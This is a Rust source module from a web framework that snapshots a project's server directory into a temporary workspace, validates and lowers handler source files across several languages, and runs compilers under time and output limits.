use super::cache::{CacheDirectory, CacheLock};
use crate::Failure;
use crate::failure::{diagnostic, source_span};
use crate::handler::readiness::RuntimeRequirement;
use crate::model_sources::ModelSources;
use crate::yon_cpp::CppYon;
use cap_fs_ext::{DirExt as _, FollowSymlinks, OpenOptionsFollowExt as _};
use cap_std::ambient_authority;
use cap_std::fs::{Dir, OpenOptions};
use command_group::CommandGroup as _;
use sha2::{Digest as _, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::fmt;
use std::fmt::Write as _;
use std::fs;
use std::io::{Read as _, Write as _};
use std::path::{Component, Path, PathBuf};
use std::process::{ExitStatus, Stdio};
use std::sync::Arc;
use std::time::{Duration, Instant};

mod compiler_error_line;
mod compiler_identities;
mod fsharp_handler;
mod fsharp_program;
mod go;
mod go_native_module;
mod groovy_build;
mod groovy_handler;
mod rust_error_place;
mod shared_handler_artifacts;
mod staged_files;
mod test_unit_asserts;
use compiler_error_line::CompilerErrorLine;
use compiler_identities::CompilerIdentities;
use fsharp_handler::FsharpHandler;
use go::GoHandler;
pub(crate) use go::GoSharedCode;
use go_native_module::GoNativeModule;
use groovy_handler::GroovyHandler;
use rust_error_place::RustErrorPlace;
use shared_handler_artifacts::SharedHandlerArtifacts;
use test_unit_asserts::TestUnitAsserts;

#[derive(Debug)]
struct CompilerOutput {
    status: ExitStatus,
    stdout: Vec<u8>,
    stderr: Vec<u8>,
    overflow: bool,
}

impl CompilerOutput {
    const MAX_BYTES: usize = 1024 * 1024;
    const DEADLINE_SETTING: &'static str = "TAC_HANDLER_COMPILE_SECONDS";
    const DEFAULT_DEADLINE_SECONDS: u64 = 60;
    const LONGEST_DEADLINE_SECONDS: u64 = 900;

    /// How long one handler compile may run. Slow or busy machines can raise it with
    /// `TAC_HANDLER_COMPILE_SECONDS`; it stays bounded, and an unusable value keeps the default.
    fn deadline() -> Duration {
        Self::deadline_from(std::env::var(Self::DEADLINE_SETTING).ok().as_deref())
    }

    fn deadline_from(configured: Option<&str>) -> Duration {
        let seconds = configured
            .and_then(|value| value.trim().parse::<u64>().ok())
            .filter(|seconds| *seconds > 0)
            .map_or(Self::DEFAULT_DEADLINE_SECONDS, |seconds| {
                seconds.min(Self::LONGEST_DEADLINE_SECONDS)
            });
        Duration::from_secs(seconds)
    }
}

struct RuntimeWorkspace {
    directory: tempfile::TempDir,
}

pub(crate) struct OwnedSourceRoot {
    workspace: Arc<RuntimeWorkspace>,
}

impl OwnedSourceRoot {
    pub(crate) fn new_project(portable: &str) -> Result<Arc<Self>, Failure> {
        RuntimeWorkspace::new(portable).map(|workspace| Arc::new(Self { workspace }))
    }

    pub(crate) fn stage(
        &self,
        relative: &Path,
        bytes: &[u8],
        portable: &str,
    ) -> Result<(), Failure> {
        let destination = self.workspace.path().join(relative);
        if let Some(parent) = destination.parent() {
            fs::create_dir_all(parent).map_err(|error| {
                invalid_source(portable, &format!("Cannot create source snapshot: {error}"))
            })?;
        }
        write_compiler_file(&destination, bytes, portable)
    }

    pub(crate) fn path(&self) -> &Path {
        self.workspace.path()
    }
}

impl fmt::Debug for OwnedSourceRoot {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str("OwnedSourceRoot(<owned>)")
    }
}

impl RuntimeWorkspace {
    fn new(portable: &str) -> Result<Arc<Self>, Failure> {
        tempfile::Builder::new()
            .prefix("tachyon-handler-runtime-")
            .tempdir()
            .map(|directory| Arc::new(Self { directory }))
            .map_err(|error| {
                invalid_source(
                    portable,
                    &format!("Cannot create runtime workspace: {error}"),
                )
            })
    }

    fn path(&self) -> &Path {
        self.directory.path()
    }
}

impl fmt::Debug for RuntimeWorkspace {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str("RuntimeWorkspace(<owned>)")
    }
}

fn validate_runtime_workspace_paths(
    interpreter: &[String],
    workspace: &RuntimeWorkspace,
    portable: &str,
) -> Result<(), Failure> {
    let workspace = fs::canonicalize(workspace.path()).map_err(|error| {
        invalid_source(
            portable,
            &format!("Cannot validate the runtime workspace: {error}"),
        )
    })?;
    for argument in interpreter {
        let path = Path::new(argument_path_candidate(argument));
        if !path.is_absolute() {
            continue;
        }
        let canonical = fs::canonicalize(path).map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot validate a runtime artifact: {error}"),
            )
        })?;
        if !canonical.starts_with(&workspace) {
            return Err(invalid_source(
                portable,
                "A prepared handler artifact escaped its owned runtime workspace.",
            ));
        }
    }
    Ok(())
}

fn argument_path_candidate(argument: &str) -> &str {
    let candidate = match argument.split_once('=') {
        Some((_, value)) => value,
        None => argument,
    };
    let Some(unquoted) = candidate
        .strip_prefix('"')
        .and_then(|value| value.strip_suffix('"'))
    else {
        return candidate;
    };
    unquoted
}

fn handler_cache(project: &Dir, portable: &str) -> Result<CacheDirectory, Failure> {
    CacheDirectory::open_project(project).map_err(|error| {
        invalid_source(
            portable,
            &format!("Handler cache ancestors must remain non-symlinked directories: {error}"),
        )
    })
}

fn cache_failure(portable: &str, context: &str, error: impl fmt::Display) -> Failure {
    invalid_source(portable, &format!("{context}: {error}"))
}

fn bounded_compiler_output(
    program: &str,
    arguments: &[String],
    current_dir: Option<&Path>,
) -> Result<CompilerOutput, String> {
    bounded_compiler_output_with_limits(
        program,
        arguments,
        current_dir,
        CompilerOutput::deadline(),
        CompilerOutput::MAX_BYTES,
    )
}

fn bounded_compiler_output_with_limits(
    program: &str,
    arguments: &[String],
    current_dir: Option<&Path>,
    compiler_deadline: Duration,
    output_bytes: usize,
) -> Result<CompilerOutput, String> {
    let command = compiler_command(program, arguments, current_dir);
    bounded_command_output(command, compiler_deadline, output_bytes)
}

fn bounded_command_output(
    mut command: std::process::Command,
    compiler_deadline: Duration,
    output_bytes: usize,
) -> Result<CompilerOutput, String> {
    let mut child = command.group_spawn().map_err(|error| error.to_string())?;
    let stdout_pipe = child
        .inner()
        .stdout
        .take()
        .ok_or("missing compiler stdout")?;
    let stdout = spawn_bounded_reader(Box::new(stdout_pipe), output_bytes);
    let stderr_pipe = child
        .inner()
        .stderr
        .take()
        .ok_or("missing compiler stderr")?;
    let stderr = spawn_bounded_reader(Box::new(stderr_pipe), output_bytes);
    let deadline = Instant::now() + compiler_deadline;
    let Some(status) = wait_until(&mut child, deadline)? else {
        let _killed = child.kill();
        let _waited = child.wait();
        let _stdout = stdout.join();
        let _stderr = stderr.join();
        return Err(format!(
            "compiler exceeded its {} millisecond deadline (set {} to allow longer)",
            compiler_deadline.as_millis(),
            CompilerOutput::DEADLINE_SETTING
        ));
    };
    let (stdout, stdout_overflow) = stdout.join().map_err(|_| "compiler stdout reader failed")?;
    let (stderr, stderr_overflow) = stderr.join().map_err(|_| "compiler stderr reader failed")?;
    Ok(CompilerOutput {
        status,
        stdout,
        stderr,
        overflow: stdout_overflow || stderr_overflow,
    })
}

fn compiler_command(
    program: &str,
    arguments: &[String],
    current_dir: Option<&Path>,
) -> std::process::Command {
    let mut command = crate::kotlin_home::KotlinHome::command(program);
    command
        .args(arguments)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if let Some(directory) = current_dir {
        command.current_dir(directory);
    }
    command
}

fn spawn_bounded_reader(
    mut pipe: Box<dyn std::io::Read + Send>,
    output_bytes: usize,
) -> std::thread::JoinHandle<(Vec<u8>, bool)> {
    std::thread::spawn(move || {
        let mut kept = Vec::new();
        let mut chunk = [0_u8; 8192];
        let mut overflow = false;
        loop {
            let read = pipe.read(&mut chunk).unwrap_or(0);
            if read == 0 {
                break;
            }
            let remaining = output_bytes.saturating_sub(kept.len());
            kept.extend_from_slice(&chunk[..read.min(remaining)]);
            overflow |= read > remaining;
        }
        (kept, overflow)
    })
}

fn wait_until(
    child: &mut command_group::GroupChild,
    deadline: Instant,
) -> Result<Option<ExitStatus>, String> {
    loop {
        if let Some(status) = child.try_wait().map_err(|error| error.to_string())? {
            return Ok(Some(status));
        }
        if Instant::now() >= deadline {
            return Ok(None);
        }
        std::thread::sleep(Duration::from_millis(5));
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum HandlerLanguage {
    JavaScript,
    Python,
    Ruby,
    TypeScript,
    Direct,
}

impl HandlerLanguage {
    #[must_use]
    pub const fn adapter(self) -> &'static str {
        match self {
            Self::JavaScript => "javascript.v1",
            Self::Python => "python.v1",
            Self::Ruby => "ruby.v1",
            Self::TypeScript | Self::Direct => "direct.v1",
        }
    }

    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::JavaScript => "javascript",
            Self::Python => "python",
            Self::Ruby => "ruby",
            Self::TypeScript => "typescript",
            Self::Direct => "direct",
        }
    }
}

pub(super) struct GatewaySnapshot<'a> {
    pub project_root: &'a Path,
    pub project: &'a Dir,
    pub source_root: &'a Arc<OwnedSourceRoot>,
}

pub struct HandlerSource {
    project_root: PathBuf,
    relative_path: String,
    absolute_path: PathBuf,
    execution_relative_path: PathBuf,
    streaming_methods: BTreeSet<String>,
    routes: Arc<[crate::yon::plan::Route]>,
    models: Arc<crate::route_types::ModelTable>,
    language: HandlerLanguage,
    interpreter: Vec<String>,
    prebuilt: bool,
    source_bytes: Arc<[u8]>,
    source_root: Arc<OwnedSourceRoot>,
    prepared_workspace: Option<Arc<RuntimeWorkspace>>,
    gateways: Option<Arc<super::gateway::GatewayTable>>,
    topics: Arc<crate::events::TopicUse>,
}

impl Clone for HandlerSource {
    fn clone(&self) -> Self {
        Self {
            project_root: self.project_root.clone(),
            relative_path: self.relative_path.clone(),
            absolute_path: self.absolute_path.clone(),
            execution_relative_path: self.execution_relative_path.clone(),
            streaming_methods: self.streaming_methods.clone(),
            routes: Arc::clone(&self.routes),
            models: Arc::clone(&self.models),
            language: self.language,
            interpreter: self.interpreter.clone(),
            prebuilt: self.prebuilt,
            source_bytes: Arc::clone(&self.source_bytes),
            source_root: Arc::clone(&self.source_root),
            prepared_workspace: self.prepared_workspace.clone(),
            gateways: self.gateways.clone(),
            topics: Arc::clone(&self.topics),
        }
    }
}

impl fmt::Debug for HandlerSource {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("HandlerSource")
            .field("project_root", &self.project_root)
            .field("relative_path", &self.relative_path)
            .field("absolute_path", &self.absolute_path)
            .field("execution_relative_path", &self.execution_relative_path)
            .field("streaming_methods", &self.streaming_methods)
            .field("routes", &self.routes)
            .field("models", &self.models)
            .field("language", &self.language)
            .field("interpreter", &self.interpreter)
            .field("prebuilt", &self.prebuilt)
            .field("source_bytes", &"<owned>")
            .field("source_root", &"<owned>")
            .field(
                "prepared_workspace",
                &self.prepared_workspace.as_ref().map(|_| "<owned>"),
            )
            .field("gateways", &self.gateways)
            .field("topics", &self.topics)
            .finish()
    }
}

impl PartialEq for HandlerSource {
    fn eq(&self, other: &Self) -> bool {
        self.project_root == other.project_root
            && self.relative_path == other.relative_path
            && self.absolute_path == other.absolute_path
            && self.language == other.language
            && self.prebuilt == other.prebuilt
            && self.source_bytes == other.source_bytes
    }
}

impl Eq for HandlerSource {}

impl HandlerSource {
    const MAX_SOURCE_BYTES: u64 = 1024 * 1024;
    const MAX_DEPENDENCY_BYTES: u64 = 16 * 1024 * 1024;
    const MAX_DEPENDENCY_TOTAL_BYTES: u64 = 64 * 1024 * 1024;
    const MAX_DEPENDENCY_FILES: usize = 4_096;

    pub fn discover_with_application(
        project_root: impl AsRef<Path>,
        relative_source: impl AsRef<Path>,
    ) -> Result<(Self, crate::ApplicationConfig), Failure> {
        let project_root = canonical_root(project_root.as_ref())?;
        let relative_source = validate_relative_source(relative_source.as_ref())?;
        let project = Dir::open_ambient_dir(&project_root, ambient_authority()).map_err(|_| {
            invalid_source(
                &portable(relative_source),
                "Cannot open the handler project directory.",
            )
        })?;
        let application =
            crate::ApplicationConfig::load_directory_for_server(&project, None, None)?;
        let source = Self::discover_opened(project_root, &project, relative_source)?;
        Ok((source, application))
    }

    pub fn discover(
        project_root: impl AsRef<Path>,
        relative_source: impl AsRef<Path>,
    ) -> Result<Self, Failure> {
        let project_root = canonical_root(project_root.as_ref())?;
        let relative_source = validate_relative_source(relative_source.as_ref())?;
        let project =
            Dir::open_ambient_dir(&project_root, ambient_authority()).map_err(|error| {
                Failure::one(diagnostic(
                    2001,
                    format!(
                        "Cannot open handler project root '{}': {error}",
                        project_root.display()
                    ),
                    None,
                    None,
                ))
            })?;
        Self::discover_opened(project_root, &project, relative_source)
    }

    pub(crate) fn discover_opened(
        project_root: PathBuf,
        project: &Dir,
        relative_source: &Path,
    ) -> Result<Self, Failure> {
        let relative_source = validate_relative_source(relative_source)?;
        let portable = portable(relative_source);
        let sources = capture_runtime_sources(project, relative_source, &portable)?;
        let bytes = sources.get(relative_source).cloned().ok_or_else(|| {
            Failure::one(diagnostic(
                2001,
                format!("Cannot inspect handler source '{portable}': source does not exist"),
                None,
                source_span(&portable, 0, portable.len()),
            ))
        })?;
        validated_source_text(&bytes, &portable)?;
        let source_root = OwnedSourceRoot::new_project(&portable)?;
        for (relative, captured) in sources {
            crate::annotation_layout::reject_reserved_folder(&relative)?;
            if crate::convention::is_yon_language(&relative)
                && let Ok(source) = std::str::from_utf8(&captured)
            {
                crate::annotation_layout::validate(&relative, source)?;
            }
            source_root.stage(&relative, &captured, &portable)?;
        }
        Self::discover_snapshot(project_root, project, relative_source, bytes, source_root)
    }

    pub(crate) fn discover_snapshot(
        project_root: PathBuf,
        project: &Dir,
        relative_source: &Path,
        bytes: Vec<u8>,
        source_root: Arc<OwnedSourceRoot>,
    ) -> Result<Self, Failure> {
        let relative_source = validate_relative_source(relative_source)?;
        let portable = portable(relative_source);
        let contents = validated_source_text(&bytes, &portable)?;
        let middleware = is_middleware(relative_source);
        if middleware {
            crate::annotation_layout::validate(relative_source, contents)?;
        }
        let go = GoHandler::is_go(relative_source);
        let annotation_entry = !middleware && crate::convention::is_yon_language(relative_source);
        let assembled = if annotation_entry && !crate::tac_cpp::CppSource::is_cpp(relative_source) {
            crate::annotation_modules::assemble(
                source_root.path(),
                relative_source,
                contents,
                "yon",
            )?
        } else {
            None
        };
        let receives_models = annotation_entry || middleware || go;
        let models = server_models(source_root.path(), relative_source, receives_models)?;
        let metadata = models.metadata();
        let has_modules = assembled.is_some();
        let bytes = assembled.map_or(bytes, String::into_bytes);
        let contents = std::str::from_utf8(&bytes)
            .map_err(|_| invalid_source(&portable, "Handler source must be valid UTF-8."))?;
        let model_program = if annotation_entry {
            metadata.assembled(relative_source, contents)?
        } else {
            contents.to_owned()
        };
        let contents = model_program.as_str();
        let (lowered, mut routes, topics) = if annotation_entry {
            lower_annotation_entry(
                source_root.path(),
                relative_source,
                contents,
                &portable,
                has_modules,
            )?
        } else {
            CppYon::middleware(middleware, relative_source, contents, source_root.path())?
        };
        let route_types = route_models(source_root.path(), relative_source, contents, &mut routes)?;
        let lowered = with_route_converters(lowered, source_root.path(), relative_source, &routes)?;
        let gateways = if annotation_entry {
            let snapshot = GatewaySnapshot {
                project_root: &project_root,
                project,
                source_root: &source_root,
            };
            super::gateway::GatewayTable::resolve(&snapshot, relative_source, contents, &portable)?
        } else {
            None
        };
        let lowered = lowered
            .map(|source| metadata.without_declarations(relative_source, &source))
            .transpose()?;
        let codecs = !routes.is_empty()
            || lowered
                .as_deref()
                .is_some_and(|program| program.contains("__YonEvents"));
        let lowered = with_models(lowered, contents, &models, codecs);
        let runtime_bytes = match &lowered {
            Some(source) => source.as_bytes(),
            None => bytes.as_slice(),
        };
        let execution_relative_path =
            execution_path(&source_root, relative_source, lowered.as_deref(), &portable)?;
        let (language, interpreter, prebuilt, prepared_workspace) = language(
            relative_source,
            runtime_bytes,
            &portable,
            project,
            &models,
            &source_root,
        )?;
        if let Some(workspace) = prepared_workspace.as_deref() {
            validate_runtime_workspace_paths(&interpreter, workspace, &portable)?;
        }
        let absolute_path = project_root.join(relative_source);
        let streaming_methods = crate::convention::streaming_methods(relative_source, contents);
        Ok(Self {
            project_root,
            relative_path: portable,
            absolute_path,
            execution_relative_path,
            streaming_methods,
            routes: Arc::from(routes),
            models: Arc::new(route_types),
            language,
            interpreter,
            prebuilt,
            source_bytes: Arc::from(bytes),
            source_root,
            prepared_workspace,
            gateways,
            topics: Arc::new(topics),
        })
    }

    pub(super) fn discover_gateway_unit(
        snapshot: &GatewaySnapshot<'_>,
        unit: &Path,
        target: &str,
        methods: &std::collections::BTreeMap<String, usize>,
    ) -> Result<Self, Failure> {
        let portable = portable(unit);
        let source_root = snapshot.source_root;
        if !source_root.path().join(unit).is_file() {
            source_root.stage(unit, b"", &portable)?;
        }
        let models = server_models(source_root.path(), unit, true)?;
        let (assembled, lowered) =
            CppYon::gateway_unit(source_root.path(), unit, target, methods, || {
                Self::managed_gateway_unit(source_root, unit, &portable, target, methods, &models)
            })?;
        let execution_relative_path =
            stage_annotated_source(source_root, unit, &lowered, &portable)?;
        let (language, interpreter, prebuilt, prepared_workspace) = language(
            unit,
            lowered.as_bytes(),
            &portable,
            snapshot.project,
            &models,
            source_root,
        )?;
        if let Some(workspace) = prepared_workspace.as_deref() {
            validate_runtime_workspace_paths(&interpreter, workspace, &portable)?;
        }
        Ok(Self {
            project_root: snapshot.project_root.to_path_buf(),
            relative_path: portable,
            absolute_path: snapshot.project_root.join(unit),
            execution_relative_path,
            streaming_methods: BTreeSet::new(),
            routes: Arc::from(Vec::new()),
            models: Arc::default(),
            language,
            interpreter,
            prebuilt,
            source_bytes: Arc::from(assembled.into_bytes()),
            source_root: Arc::clone(source_root),
            prepared_workspace,
            gateways: None,
            topics: Arc::default(),
        })
    }

    fn managed_gateway_unit(
        source_root: &OwnedSourceRoot,
        unit: &Path,
        portable: &str,
        target: &str,
        methods: &std::collections::BTreeMap<String, usize>,
        models: &ModelSources,
    ) -> Result<(String, String), Failure> {
        let assembled = crate::annotation_modules::assemble(source_root.path(), unit, "", "yon")?
            .ok_or_else(|| {
            crate::behavior::gateway_target_failure(
                portable,
                0,
                "Gateway target has no role files to compose",
            )
        })?;
        let metadata = models.metadata();
        let assembled = metadata.assembled(unit, &assembled)?;
        let lowered = crate::yon::lower_gateway_unit(unit, &assembled, target, methods)?;
        let lowered = metadata.without_declarations(unit, &lowered)?;
        let lowered = with_models(Some(lowered), &assembled, models, false).unwrap_or_default();
        Ok((assembled, lowered))
    }

    #[must_use]
    pub const fn prebuilt(&self) -> bool {
        self.prebuilt
    }

    #[must_use]
    pub fn project_root(&self) -> &Path {
        &self.project_root
    }

    #[must_use]
    pub fn relative_path(&self) -> &str {
        &self.relative_path
    }

    #[must_use]
    pub fn absolute_path(&self) -> &Path {
        &self.absolute_path
    }

    #[must_use]
    pub const fn language(&self) -> HandlerLanguage {
        self.language
    }

    #[must_use]
    pub fn streams_method(&self, method: tachyon_contracts::HttpMethod) -> bool {
        use tachyon_contracts::HttpMethod;
        let name = match method {
            HttpMethod::Delete => "DELETE",
            HttpMethod::Get => "GET",
            HttpMethod::Head => "HEAD",
            HttpMethod::Options => "OPTIONS",
            HttpMethod::Patch => "PATCH",
            HttpMethod::Post => "POST",
            HttpMethod::Put => "PUT",
        };
        self.streaming_methods.contains(name)
    }

    #[must_use]
    pub fn interpreter(&self) -> &[String] {
        &self.interpreter
    }

    pub(crate) fn routes(&self) -> &[crate::yon::plan::Route] {
        &self.routes
    }

    pub(crate) fn models(&self) -> &crate::route_types::ModelTable {
        &self.models
    }

    #[must_use]
    pub(crate) fn execution_path(&self) -> PathBuf {
        self.source_root.path().join(&self.execution_relative_path)
    }

    pub(crate) fn execution_relative_path(&self) -> &Path {
        &self.execution_relative_path
    }

    #[must_use]
    pub(crate) fn execution_root(&self) -> &Path {
        self.source_root.path()
    }

    #[must_use]
    pub(crate) fn execution_working_directory(&self) -> &Path {
        self.source_root.path()
    }

    pub(crate) fn gateways(&self) -> Option<&Arc<super::gateway::GatewayTable>> {
        self.gateways.as_ref()
    }

    pub(crate) fn topic_listeners(&self) -> &[(String, String)] {
        &self.topics.listeners
    }

    pub(crate) fn topic_names(&self) -> &[String] {
        &self.topics.topics
    }
}

fn validated_source_text<'source>(
    bytes: &'source [u8],
    portable: &str,
) -> Result<&'source str, Failure> {
    if bytes.len() as u64 > HandlerSource::MAX_SOURCE_BYTES {
        return Err(invalid_source(
            portable,
            "Handler source exceeds the 1 MiB Phase 2 limit.",
        ));
    }
    if bytes.contains(&0) {
        return Err(invalid_source(
            portable,
            "Handler source contains a NUL byte.",
        ));
    }
    std::str::from_utf8(bytes)
        .map_err(|_| invalid_source(portable, "Handler source must be valid UTF-8."))
}

fn reject_shebang(contents: &str, portable: &str) -> Result<(), Failure> {
    if !contents.starts_with("#!") {
        return Ok(());
    }
    let first_line_length = contents.lines().next().map_or(0, str::len);
    Err(Failure::one(diagnostic(
        2003,
        format!("Handler source '{portable}' begins with a shebang."),
        Some(String::from(
            "Yon owns the runtime for every supported language. Delete the first line; \
             executable bits and self-selected interpreters are not handler APIs.",
        )),
        source_span(portable, 0, first_line_length),
    )))
}

fn execution_path(
    source_root: &OwnedSourceRoot,
    relative_source: &Path,
    lowered: Option<&str>,
    portable: &str,
) -> Result<PathBuf, Failure> {
    let Some(lowered) = lowered else {
        return Ok(relative_source.to_path_buf());
    };
    stage_annotated_source(source_root, relative_source, lowered, portable)
}

fn server_models(
    source_root: &Path,
    relative_source: &Path,
    receives_models: bool,
) -> Result<ModelSources, Failure> {
    if !receives_models {
        return Ok(ModelSources::none());
    }
    let extension = lowercase_extension(relative_source);
    ModelSources::read(source_root, "server", &extension)
}

fn with_models(
    lowered: Option<String>,
    contents: &str,
    models: &ModelSources,
    codecs: bool,
) -> Option<String> {
    if !models.changes_program_text() {
        return lowered;
    }
    let program = lowered.as_deref().unwrap_or(contents);
    Some(models.add_to_yon_program(program, codecs))
}

type LoweredEntry = (
    Option<String>,
    Vec<crate::yon::plan::Route>,
    crate::events::TopicUse,
);

fn with_route_converters(
    lowered: Option<String>,
    root: &Path,
    relative_source: &Path,
    routes: &[crate::yon::plan::Route],
) -> Result<Option<String>, Failure> {
    let Some(program) = lowered else {
        return Ok(None);
    };
    let has_events = program.contains("__YonEvents");
    if routes.is_empty() && !has_events {
        return Ok(Some(program));
    }
    let extension = lowercase_extension(relative_source);
    let converters = crate::route_types::Converters::program_text(&extension, root)
        .map_err(|message| invalid_source(&portable(relative_source), &message))?;
    let imports = crate::route_types::Converters::program_imports(&extension, root)
        .map_err(|message| invalid_source(&portable(relative_source), &message))?;
    Ok(Some(format!("{imports}{program}\n{converters}")))
}

fn route_models(
    root: &Path,
    relative_source: &Path,
    contents: &str,
    routes: &mut [crate::yon::plan::Route],
) -> Result<crate::route_types::ModelTable, Failure> {
    if routes.is_empty() {
        return Ok(crate::route_types::ModelTable::default());
    }
    let extension = lowercase_extension(relative_source);
    crate::route_types::RouteTypes::resolve(&extension, root, contents, routes).map_err(|message| {
        let portable = portable(relative_source);
        Failure::one(diagnostic(
            2015,
            format!("Cannot read the route types in '{portable}': {message}"),
            Some(String::from(
                "Route parameters and return values use text, numbers, true or false, lists, or models from server/models/ (ADR 0048).",
            )),
            source_span(&portable, 0, contents.len()),
        ))
    })
}

fn lower_annotation_entry(
    models_root: &Path,
    relative_source: &Path,
    contents: &str,
    portable: &str,
    has_modules: bool,
) -> Result<LoweredEntry, Failure> {
    reject_shebang(contents, portable)?;
    crate::convention::check_handler(relative_source, contents)?;
    lower_annotated_source(models_root, relative_source, contents, has_modules)
}

fn lower_annotated_source(
    models_root: &Path,
    relative_source: &Path,
    contents: &str,
    has_modules: bool,
) -> Result<LoweredEntry, Failure> {
    let lowered = if crate::fsharp_source::FsharpSource::is_fsharp(relative_source) {
        crate::fsharp_source::FsharpYon::lower(relative_source, contents, Some(models_root))?
    } else if crate::lua_source::LuaSource::is_lua(relative_source) {
        crate::lua_source::LuaYon::lower(relative_source, contents, Some(models_root))?
    } else if crate::tac_cpp::CppSource::is_cpp(relative_source) {
        Some(crate::yon_cpp::CppYon::lower(
            relative_source,
            contents,
            models_root,
        )?)
    } else {
        crate::yon::lower_with_routes(relative_source, contents, Some(models_root))?
    };
    if let Some(lowered) = lowered {
        return Ok((Some(lowered.source), lowered.routes, lowered.topics));
    }
    if has_modules {
        return Ok((
            Some(contents.to_owned()),
            Vec::new(),
            crate::events::TopicUse::default(),
        ));
    }
    Ok((None, Vec::new(), crate::events::TopicUse::default()))
}

fn stage_annotated_source(
    root: &OwnedSourceRoot,
    source: &Path,
    lowered: &str,
    portable: &str,
) -> Result<PathBuf, Failure> {
    let digest = crate::compiler::hex_digest(Sha256::digest(lowered.as_bytes()));
    let extension = source
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or("");
    let relative = source.with_file_name(format!(".__yon_{digest}.{extension}"));
    let destination = root.path().join(&relative);
    match fs::symlink_metadata(&destination) {
        Ok(metadata) if metadata.is_file() && !metadata.file_type().is_symlink() => {
            let existing = fs::read(&destination).map_err(|error| {
                invalid_source(
                    portable,
                    &format!("Cannot validate generated Yon source: {error}"),
                )
            })?;
            if existing != lowered.as_bytes() {
                return Err(invalid_source(
                    portable,
                    "Generated Yon source name conflicts with a captured file.",
                ));
            }
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            root.stage(&relative, lowered.as_bytes(), portable)?;
        }
        _ => {
            return Err(invalid_source(
                portable,
                "Generated Yon source must be a regular owned file.",
            ));
        }
    }
    Ok(relative)
}

fn capture_runtime_sources(
    project: &Dir,
    relative_source: &Path,
    portable_source: &str,
) -> Result<BTreeMap<PathBuf, Vec<u8>>, Failure> {
    let mut files = BTreeMap::new();
    let mut total = 0_u64;
    capture_server_root(project, portable_source, &mut files, &mut total)?;
    if is_middleware(relative_source) {
        capture_project_dependency(
            project,
            relative_source,
            portable_source,
            &mut files,
            &mut total,
        )?;
    }
    Ok(files)
}

fn capture_server_root(
    project: &Dir,
    portable_source: &str,
    files: &mut BTreeMap<PathBuf, Vec<u8>>,
    total: &mut u64,
) -> Result<(), Failure> {
    let metadata = match project.symlink_metadata("server") {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(error) => return source_io(Err(error), portable_source),
    };
    if metadata.is_symlink() || !metadata.is_dir() {
        return Err(invalid_source(
            portable_source,
            "Handler server root must be a regular, non-symlinked directory.",
        ));
    }
    let server = source_io(project.open_dir_nofollow("server"), portable_source)?;
    capture_server_directory(&server, Path::new("server"), portable_source, files, total)
}

fn capture_project_dependency(
    project: &Dir,
    relative: &Path,
    portable_source: &str,
    files: &mut BTreeMap<PathBuf, Vec<u8>>,
    total: &mut u64,
) -> Result<(), Failure> {
    let portable = portable(relative);
    let metadata = source_io(project.symlink_metadata(relative), &portable)?;
    if metadata.is_symlink() || !metadata.is_file() {
        return Err(invalid_source(
            &portable,
            "Handler dependencies must be regular, non-symlinked files.",
        ));
    }
    if metadata.len() > HandlerSource::MAX_DEPENDENCY_BYTES {
        return Err(invalid_source(
            &portable,
            "Handler dependency exceeds the 16 MiB per-file limit.",
        ));
    }
    if files.len() >= HandlerSource::MAX_DEPENDENCY_FILES {
        return Err(invalid_source(
            portable_source,
            "Handler source snapshot exceeds the 4,096-file limit.",
        ));
    }
    let bytes = read_captured_file(project, relative, &portable)?;
    *total = total.saturating_add(bytes.len() as u64);
    if *total > HandlerSource::MAX_DEPENDENCY_TOTAL_BYTES {
        return Err(invalid_source(
            portable_source,
            "Handler source snapshot exceeds the 64 MiB total limit.",
        ));
    }
    files.insert(relative.to_path_buf(), bytes);
    Ok(())
}

fn capture_server_directory(
    directory: &Dir,
    relative_directory: &Path,
    portable_source: &str,
    files: &mut BTreeMap<PathBuf, Vec<u8>>,
    total: &mut u64,
) -> Result<(), Failure> {
    for entry in sorted_directory_entries(directory, portable_source)? {
        let name = entry.file_name();
        let relative = relative_directory.join(&name);
        let portable = portable(&relative);
        let metadata = source_io(directory.symlink_metadata(&name), &portable)?;
        if metadata.is_symlink() {
            return Err(invalid_source(
                &portable,
                "Symlinked handler dependencies are not allowed.",
            ));
        }
        if metadata.is_dir() {
            let child = source_io(directory.open_dir_nofollow(&name), &portable)?;
            capture_server_directory(&child, &relative, portable_source, files, total)?;
            continue;
        }
        check_server_file_metadata(&metadata, &portable)?;
        if files.len() >= HandlerSource::MAX_DEPENDENCY_FILES {
            return Err(invalid_source(
                portable_source,
                "Handler server snapshot exceeds the 4,096-file limit.",
            ));
        }
        let bytes = read_captured_file(directory, Path::new(&name), &portable)?;
        *total = total.saturating_add(bytes.len() as u64);
        if *total > HandlerSource::MAX_DEPENDENCY_TOTAL_BYTES {
            return Err(invalid_source(
                portable_source,
                "Handler server snapshot exceeds the 64 MiB total limit.",
            ));
        }
        files.insert(relative, bytes);
    }
    Ok(())
}

fn sorted_directory_entries(
    directory: &Dir,
    portable_source: &str,
) -> Result<Vec<cap_std::fs::DirEntry>, Failure> {
    let entries = source_io(directory.entries(), portable_source)?;
    let mut entries = entries.collect::<Result<Vec<_>, _>>().map_err(|error| {
        invalid_source(
            portable_source,
            &format!("Cannot enumerate owned server sources: {error}"),
        )
    })?;
    entries.sort_by_key(cap_std::fs::DirEntry::file_name);
    Ok(entries)
}

fn check_server_file_metadata(
    metadata: &cap_std::fs::Metadata,
    portable: &str,
) -> Result<(), Failure> {
    if !metadata.is_file() {
        return Err(invalid_source(
            portable,
            "Handler dependencies must be regular files or directories.",
        ));
    }
    if metadata.len() > HandlerSource::MAX_DEPENDENCY_BYTES {
        return Err(invalid_source(
            portable,
            "Handler dependency exceeds the 16 MiB per-file limit.",
        ));
    }
    Ok(())
}

